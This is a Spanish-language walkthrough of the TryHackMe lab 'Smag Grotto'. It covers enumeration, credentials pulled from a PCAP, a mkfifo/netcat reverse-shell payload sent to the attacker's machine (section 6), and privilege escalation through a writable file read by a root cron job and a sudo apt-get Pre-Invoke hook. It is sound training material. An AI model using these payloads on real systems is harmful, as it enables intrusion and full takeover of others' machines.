# Smag Grotto — TryHackMe

**Plataforma:** TryHackMe  
**Dificultad:** Easy  
**Sistema operativo:** Linux  
**IP objetivo:** `10.64.157.142`  
**Técnicas utilizadas:** Nmap, enumeración web, análisis de tráfico con Wireshark, credenciales expuestas, Reverse Shell y escalada de privilegios.

---

## 1. Reconocimiento inicial

Lo primero que hice fue identificar los puertos abiertos de la máquina. Para esto utilicé Nmap con detección de servicios y versiones.

```bash
sudo nmap -sS -sCV -p- --min-rate=5000 -n -Pn 10.64.157.142 -oG ports
```

### Resultados

Encontré dos puertos abiertos:

| Puerto | Servicio | Versión |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.2p2 |
| 80/tcp | HTTP | Apache 2.4.18 |

El puerto 80 ejecutaba un servidor web Apache y el puerto 22 permitía conexiones SSH.

**Mi siguiente paso fue investigar el sitio web.**

### Captura de pantalla

> [PEGAR IMAGEN: Resultado del escaneo de Nmap]

---

## 2. Enumeración web

Al entrar en la dirección IP desde el navegador, encontré una página sencilla con el mensaje:

> Welcome to Smag! This site is still heavily under development...

La página no mostraba demasiada información, así que continué explorando las rutas disponibles.

Durante la enumeración encontré una sección llamada `/mail`.

Allí había un correo electrónico relacionado con una migración de red.

### Información encontrada

- Remitente: `jake@smag.thm`
- Destinatario: `netadmin@smag.thm`
- Copia: `uzi@smag.thm`
- Asunto: Network Migration
- Archivo adjunto: `dHJhY2Uy.pcap`

El correo mencionaba una migración de red desde `192.168.33.0/24` hacia `10.10.0.0/8`.

También encontré una referencia a un problema con la aplicación `email2web` y sus archivos adjuntos.

Esto me dio una pista importante: debía investigar el archivo PCAP.

### Captura de pantalla

> [PEGAR IMAGEN: Correo electrónico encontrado en /mail]

---

## 3. Descarga del archivo PCAP

El nombre del archivo adjunto parecía extraño:

`dHJhY2Uy.pcap`

También encontré que la ruta de descarga utilizaba un directorio codificado en Base64:

`aW1wb3J0YW50`

Al decodificarlo obtuve:

```text
important
```

La ruta completa del archivo era:

```text
http://10.64.157.142/aW1wb3J0YW50/dHJhY2Uy.pcap
```

Descargué el archivo utilizando wget:

```bash
wget http://10.64.157.142/aW1wb3J0YW50/dHJhY2Uy.pcap
```

Ahora tenía un archivo de captura de tráfico de red que podía analizar con Wireshark.

### Captura de pantalla

> [PEGAR IMAGEN: Descarga del archivo PCAP]

---

## 4. Análisis del tráfico con Wireshark

Abrí el archivo PCAP con Wireshark para revisar las comunicaciones capturadas.

Mi objetivo era encontrar información interesante, como solicitudes HTTP, credenciales o nombres de dominio internos.

Al revisar el tráfico HTTP encontré una solicitud POST que contenía los siguientes datos:

```text
username=helpdesk
password=cH4nG3M3_n0w
```

Estas credenciales parecían corresponder a un formulario de autenticación.

También encontré una referencia al dominio:

```text
development.smag.thm
```

Esta información era especialmente importante porque indicaba que existía otro sitio web asociado a la máquina.

**Una captura de tráfico puede revelar información que no es visible directamente desde el sitio web.** Por eso es importante revisar los paquetes y no limitarse a escanear puertos.

### Capturas de pantalla

> [PEGAR IMAGEN: Solicitud HTTP POST con las credenciales]

> [PEGAR IMAGEN: Host development.smag.thm en Wireshark]

---

## 5. Acceso al entorno de desarrollo

Para acceder al dominio encontrado, tuve que agregarlo al archivo `/etc/hosts` de Kali Linux.

```bash
sudo nano /etc/hosts
```

Agregué la siguiente línea:

```text
10.64.157.142 development.smag.thm
```

Después accedí desde el navegador:

```text
http://development.smag.thm
```

Utilicé las credenciales encontradas en el tráfico:

```text
Usuario: helpdesk
Contraseña: cH4nG3M3_n0w
```

Con ellas conseguí acceder a un panel que tenía una funcionalidad para introducir comandos.

Esta funcionalidad fue la pista que necesitaba para intentar conseguir ejecución remota de comandos.

### Capturas de pantalla

> [PEGAR IMAGEN: Archivo /etc/hosts configurado]

> [PEGAR IMAGEN: Panel de desarrollo después de iniciar sesión]

---

## 6. Obtención de una Reverse Shell

El panel permitía introducir comandos. Aproveché esta funcionalidad para intentar establecer una conexión inversa desde la máquina objetivo hacia mi máquina Kali.

Primero identifiqué la dirección IP de mi interfaz VPN:

```bash
ip -4 addr show tun0
```

Después preparé un listener con Netcat:

```bash
nc -lvnp 4444
```

En el panel introduje el siguiente payload:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_DE_KALI 4444 >/tmp/f
```

Reemplacé `IP_DE_KALI` por la dirección IP de mi interfaz `tun0`.

### ¿Qué hace este payload?

- `rm /tmp/f`: elimina un archivo anterior si existe.
- `mkfifo /tmp/f`: crea una tubería con nombre para comunicar procesos.
- `cat /tmp/f`: lee los datos que llegan a esa tubería.
- `/bin/sh -i`: inicia una shell interactiva.
- `2>&1`: redirige los errores hacia la salida estándar.
- `nc`: establece la conexión de red hacia mi máquina Kali.

Cuando la conexión se estableció, conseguí una shell dentro de la máquina objetivo.

Comprobé el usuario actual:

```bash
id
```

El resultado fue:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ya tenía acceso como `www-data`.

### Capturas de pantalla

> [PEGAR IMAGEN: Listener de Netcat recibiendo la conexión]

> [PEGAR IMAGEN: Resultado del comando id mostrando www-data]

---

## 7. Escalada de privilegios: www-data a jake

Con acceso a la máquina, comencé a buscar posibles errores de configuración que permitieran escalar privilegios.

Durante la enumeración encontré un archivo interesante:

```text
/opt/.backups/jake_id_rsa.pub.backup
```

Revisé sus permisos:

```bash
ls -l /opt/.backups/jake_id_rsa.pub.backup
```

El resultado fue:

```text
-rw-rw-rw- 1 root root 563 Jun 5 2020 /opt/.backups/jake_id_rsa.pub.backup
```

Lo importante era que el archivo tenía permisos `666`.

Esto significa que cualquier usuario podía leerlo y modificarlo, incluso `www-data`.

Después revisé la configuración de tareas programadas:

```bash
cat /etc/crontab
```

Encontré una tarea ejecutada por root:

```bash
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

Aquí estaba el problema.

Cada minuto, el sistema copiaba el contenido del archivo modificable hacia el archivo `authorized_keys` del usuario `jake`.

Esto permitía aprovechar la tarea programada para introducir una clave pública SSH propia.

### Preparación de las claves SSH

Desde mi máquina Kali generé un par de claves:

```bash
ssh-keygen -t rsa -b 2048 -f ~/smag_key
```

Se crearon dos archivos:

- `smag_key`: clave privada.
- `smag_key.pub`: clave pública.

La clave pública era la que necesitaba introducir en el archivo vulnerable.

En Kali consulté su contenido:

```bash
cat ~/smag_key.pub
```

Copié la línea completa y, desde la shell de `www-data`, sobrescribí el archivo vulnerable:

```bash
echo 'PEGAR_AQUI_LA_CLAVE_PUBLICA_COMPLETA' > /opt/.backups/jake_id_rsa.pub.backup
```

Esperé a que se ejecutara la tarea programada y después intenté conectarme por SSH:

```bash
ssh -i ~/smag_key jake@10.64.157.142
```

Si la clave fue instalada correctamente, debería obtener acceso como `jake` sin necesitar su contraseña.

### Capturas de pantalla

> [PEGAR IMAGEN: Permisos del archivo jake_id_rsa.pub.backup]

> [PEGAR IMAGEN: Tarea cron vulnerable]

> [PEGAR IMAGEN: Generación de las claves SSH]

> [PEGAR IMAGEN: Conexión SSH como jake]

---

## 8. Escalada de privilegios: jake a root

Una vez obtenido el acceso como `jake`, el siguiente paso fue revisar qué comandos podía ejecutar con privilegios elevados.

Utilicé:

```bash
sudo -l
```

La configuración vulnerable de esta máquina permite ejecutar `apt-get` como root sin contraseña:

```text
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Esto es peligroso porque `apt-get` permite utilizar opciones y hooks que ejecutan comandos durante determinadas operaciones.

En este caso, aproveché el hook `APT::Update::Pre-Invoke` para ejecutar una shell con privilegios de root.

El comando utilizado fue:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Después comprobé los privilegios:

```bash
whoami
```

El resultado esperado era:

```text
root
```

Con esto se completa la escalada de privilegios.

### ¿Por qué funciona?

El usuario `jake` tiene permiso para ejecutar `apt-get` como root sin introducir una contraseña.

El hook `Pre-Invoke` permite ejecutar un comando antes de que se realice la actualización. Como `apt-get` se ejecuta con privilegios de root, el comando asociado también se ejecuta con esos privilegios.

### Capturas de pantalla

> [PEGAR IMAGEN: Resultado de sudo -l]

> [PEGAR IMAGEN: Ejecución del comando de escalada]

> [PEGAR IMAGEN: whoami mostrando root]

---

## 9. Obtención de la Root Flag

Con acceso como root, busqué el archivo de la última flag:

```bash
cat /root/root.txt
```

La información obtenida corresponde a la Root Flag de la máquina.

```text
Root Flag: PEGAR_AQUI_TU_FLAG
```

### Captura de pantalla

> [PEGAR IMAGEN: Root Flag obtenida]

---

## 10. Conclusiones y aprendizajes

Esta máquina me permitió practicar varias etapas de un proceso de pentesting.

Lo que más me llamó la atención fue que no todo comenzó con una vulnerabilidad compleja. La información más importante apareció al investigar los correos electrónicos y analizar el tráfico de red.

Los principales aprendizajes fueron:

1. **Enumeración:** identificar puertos y servicios es el primer paso para conocer la superficie de ataque.
2. **Análisis de tráfico:** un archivo PCAP puede contener credenciales y nombres de dominio que no aparecen en la página principal.
3. **Virtual hosting:** algunos servicios web utilizan nombres de dominio internos que debemos agregar a `/etc/hosts`.
4. **Ejecución remota de comandos:** una funcionalidad web mal protegida puede permitir obtener una shell en el servidor.
5. **Permisos Linux:** los permisos de escritura sobre archivos utilizados por tareas de root pueden crear oportunidades de escalada.
6. **Tareas cron:** es importante revisar qué ejecutan, con qué usuario y sobre qué archivos trabajan.
7. **SSH:** las claves públicas y privadas permiten autenticarse sin utilizar contraseñas.
8. **Sudo:** una configuración incorrecta de permisos puede permitir ejecutar comandos como root.

### Cadena de compromiso

```text
Enumeración Nmap
      |
      v
Servidor web y sección /mail
      |
      v
Descarga del archivo PCAP
      |
      v
Análisis con Wireshark
      |
      v
Credenciales helpdesk
      |
      v
Acceso a development.smag.thm
      |
      v
Ejecución remota de comandos
      |
      v
Reverse Shell como www-data
      |
      v
Archivo modificable + tarea cron
      |
      v
Acceso SSH como jake
      |
      v
sudo apt-get mal configurado
      |
      v
ROOT
```

**Fin del laboratorio — Smag Grotto.**
